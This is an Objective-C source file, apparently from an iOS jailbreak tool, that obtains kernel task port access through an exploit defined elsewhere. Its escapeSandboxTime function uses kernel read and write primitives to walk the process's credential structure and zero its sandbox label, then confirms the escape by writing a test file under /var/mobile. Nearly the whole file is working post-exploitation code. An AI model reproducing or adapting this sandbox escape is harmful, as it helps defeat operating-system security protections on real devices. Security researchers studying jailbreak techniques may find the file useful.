//
//  time_frame.m
//  time_frame
//
//  Created by Brandon Plank on 7/17/20.
//  Copyright © 2020 Brandon Plank. All rights reserved.
//

#import <Foundation/Foundation.h>
#include "time_framer.h"
#include "kernel_memory.h"
#include "exploit.h"
#include "offsets.h"

#define LOG(string, args...) do {\
printf(string "\n", ##args); \
} while (0)

uint64_t selfproc_cached;
uint64_t task_self_cache;

int run_time_waste(){
    return get_tfp0();
}

uint64_t getselfproc(){
    return selfproc_cached;
}

bool escapeSandboxTime() {
    // 00 00 00 00 00 | No Sandbox
    // 01 00 00 00 00 | Sandbox
    
    LOG("[*] selfproc: 0x%016llx", selfproc_cached);
    
    uint64_t ucred = rk64(selfproc_cached + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    LOG("[*] ucred: 0x%016llx", ucred);
    uint64_t cr_label = rk64(ucred + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL));
    LOG("[*] cr_label: 0x%016llx", cr_label);
    uint64_t sandbox_addr = cr_label + 0x8 + 0x8;
    LOG("[*] sandbox_addr: 0x%016llx", sandbox_addr);
    wk64(sandbox_addr, (uint64_t) 0);
    
    [[NSFileManager defaultManager] createFileAtPath:@"/var/mobile/test_jb" contents:NULL attributes:nil];
    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/mobile/test_jb"])
    {
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/mobile/test_jb" error:nil];
        return true;
    } else {
        return false;
    }
    
}

uint64_t getTaskSelf(){
    return task_self_cache;
}



